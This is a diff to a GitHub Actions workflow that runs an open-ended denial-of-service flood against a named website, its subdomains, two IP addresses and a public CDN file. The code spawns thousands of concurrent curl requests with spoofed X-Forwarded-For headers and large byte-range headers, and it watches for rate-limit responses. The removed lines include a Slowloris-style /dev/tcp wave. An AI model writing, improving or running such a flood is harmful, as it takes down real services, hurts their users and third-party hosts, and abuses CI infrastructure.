@@ -15,11 +15,11 @@ on:
 jobs:
   dos:
     runs-on: ubuntu-latest
-    timeout-minutes: 999999  # عمليًا لا نهائي
+    timeout-minutes: 999999
     
     steps:
       - name: Install tools
-        run: sudo apt update && sudo apt install -y curl parallel
+        run: sudo apt update && sudo apt install -y curl
         
       - name: 💀 INFINITE DOS - MAX POWER ×20
         run: |
@@ -29,101 +29,87 @@ jobs:
           echo ""
           echo "🎯 Target: flixtn.com + all subdomains"
           echo "⚡ Power multiplier: ${{ github.event.inputs.intensity }}x"
-          echo "⏱️  Duration: ${{ github.event.inputs.run_hours == '0' && 'INFINITE' }} hours"
+          echo "⏱️  Duration: ${{ github.event.inputs.run_hours == '0' && 'INFINITE' || github.event.inputs.run_hours }} hours"
           echo ""
           
-          # حساب عدد الخيوط (أساس 500 × المضاعف)
+          # حساب عدد الخيوط
           BASE_THREADS=500
           MULTIPLIER=${{ github.event.inputs.intensity }}
           THREADS=$((BASE_THREADS * MULTIPLIER))
           echo "🔥 Threads: $THREADS"
           echo ""
           
-          # إنشاء قائمة الأهداف (كل ما يمكن ضربه)
-          cat > targets.txt << 'EOF'
-          https://flixtn.com/
-          https://flixtn.com/api
-          https://flixtn.com/admin
-          https://flixtn.com/login
-          https://flixtn.com/dashboard
-          https://flixtn.com/admin-auth
-          https://flixtn.com/assets/index-DiQY9GeF.css
-          https://flixtn.com/assets/index-CllXAbrg.js
-          https://flixtn.com/assets/prod-Bk_YgDXS.js
-          https://flixtn.com/assets/prod-QfiXFxxq.js
-          https://flixtn.com/assets/enhancements.js
-          https://flixtn.com/assets/seasons.js
-          https://flixtn.com/assets/admin-panel.js
-          https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js
-          https://64.29.17.65/
-          https://216.198.79.65/
-          http://64.29.17.65/
-          http://216.198.79.65/
-          https://www.flixtn.com/
-          https://api.flixtn.com/
-          https://admin.flixtn.com/
-          https://cdn.flixtn.com/
-          EOF
-          
-          # مضاعفة الأهداف بعدد الخيوط
-          for i in {1..10}; do
-            cat targets.txt >> targets_${i}.txt
-          done
-          cat targets_*.txt > all_targets.txt
+          # قائمة الأهداف
+          TARGETS=(
+            "https://flixtn.com/"
+            "https://flixtn.com/api"
+            "https://flixtn.com/admin"
+            "https://flixtn.com/login"
+            "https://flixtn.com/dashboard"
+            "https://flixtn.com/admin-auth"
+            "https://flixtn.com/assets/index-DiQY9GeF.css"
+            "https://flixtn.com/assets/index-CllXAbrg.js"
+            "https://flixtn.com/assets/prod-Bk_YgDXS.js"
+            "https://flixtn.com/assets/prod-QfiXFxxq.js"
+            "https://flixtn.com/assets/enhancements.js"
+            "https://flixtn.com/assets/seasons.js"
+            "https://flixtn.com/assets/admin-panel.js"
+            "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"
+            "https://64.29.17.65/"
+            "https://216.198.79.65/"
+            "http://64.29.17.65/"
+            "http://216.198.79.65/"
+            "https://www.flixtn.com/"
+            "https://api.flixtn.com/"
+            "https://admin.flixtn.com/"
+            "https://cdn.flixtn.com/"
+          )
           
           echo "🚀 LAUNCHING INFINITE ATTACK 🚀"
           echo ""
           
-          # إعداد الوقت
+          # حساب وقت الانتهاء إذا كان محدودًا
           if [ "${{ github.event.inputs.run_hours }}" != "0" ]; then
             END_TIME=$((SECONDS + (${{ github.event.inputs.run_hours }} * 3600)))
-            LOOP="while [ \$SECONDS -lt \$END_TIME ]; do"
+            echo "⏱️  Will run for ${{ github.event.inputs.run_hours }} hours"
           else
-            LOOP="while true; do"
+            echo "⏱️  Running INFINITE (until manually stopped)"
           fi
+          echo ""
           
-          # تنفيذ الهجوم
-          $LOOP
-            # الموجة 1: Curl flood مع أكبر استهلاك للباندويث
-            for i in $(seq 1 $THREADS); do
-              curl -s -o /dev/null "https://flixtn.com/" \
-                -H "Range: bytes=0-1000000" \
-                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
-                -H "Accept: */*" \
-                -H "Accept-Language: ar,en;q=0.9" \
-                -H "Cache-Control: no-cache" \
-                -H "Pragma: no-cache" \
-                -H "X-Forwarded-For: $((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))" \
-                --max-time 2 \
-                --retry 0 \
-                2>/dev/null &
-            done
+          # حلقة لا نهائية
+          TOTAL=0
+          while true; do
+            # إذا كان هناك وقت محدد ووصلنا له، اخرج
+            if [ "${{ github.event.inputs.run_hours }}" != "0" ] && [ $SECONDS -ge $END_TIME ]; then
+              echo ""
+              echo "✅ Time limit reached. Stopping attack."
+              break
+            fi
             
-            # الموجة 2: ضرب جميع الملفات الكبيرة
-            while IFS= read -r target; do
-              for i in $(seq 1 $((THREADS / 10))); do
+            # هجوم على جميع الأهداف
+            for target in "${TARGETS[@]}"; do
+              for i in $(seq 1 $THREADS); do
                 curl -s -o /dev/null "$target" \
-                  -H "Range: bytes=0-500000" \
+                  -H "Range: bytes=0-1000000" \
+                  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
+                  -H "Accept: */*" \
+                  -H "Cache-Control: no-cache" \
+                  -H "Pragma: no-cache" \
+                  -H "X-Forwarded-For: $((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))" \
                   --max-time 2 \
+                  --retry 0 \
                   2>/dev/null &
               done
-            done < all_targets.txt
-            
-            # الموجة 3: هجوم بطيء (Slowloris style)
-            for i in $(seq 1 $((THREADS / 20))); do
-              (
-                exec 3<>/dev/tcp/flixtn.com/443
-                echo -e "GET / HTTP/1.1\r\nHost: flixtn.com\r\nUser-Agent: Mozilla/5.0\r\n" >&3
-                sleep 10
-                exec 3<&-
-              ) &
             done
+            
+            TOTAL=$((TOTAL + (${#TARGETS[@]} * THREADS)))
             
             # عرض الإحصائيات كل 30 ثانية
             if [ $((SECONDS % 30)) -eq 0 ]; then
               ELAPSED=$((SECONDS / 60))
               STATUS=$(curl -s -o /dev/null -w "%{http_code}" -m 3 "https://flixtn.com/" 2>/dev/null)
-              echo "[$(date +%H:%M:%S)] 🔥 ${ELAPSED}min | 📊 Status: $STATUS | 🧵 Threads: $THREADS"
+              echo "[$(date +%H:%M:%S)] 🔥 ${ELAPSED}min | 📊 Status: $STATUS | 🧵 Threads: $THREADS | 📈 Total: $TOTAL"
               
               if [[ "$STATUS" == "429" ]]; then
                 echo "⚠️  ⚠️  ⚠️  RATE LIMIT HIT! Vercel is throttling! ⚠️  ⚠️  ⚠️"
@@ -134,14 +120,13 @@ jobs:
               fi
             fi
             
-            sleep 0.01  # تأخير صغير جدًا للحفاظ على الاستقرار
-            
+            sleep 0.01
           done
           
           echo ""
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-          echo "📊 ATTACK STATISTICS:"
+          echo "📊 FINAL STATISTICS:"
+          echo "   Total requests: $TOTAL"
           echo "   Total time: $((SECONDS / 60)) minutes"
           echo "   Threads: $THREADS"
-          echo "   Status: Attack completed or manually stopped"
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
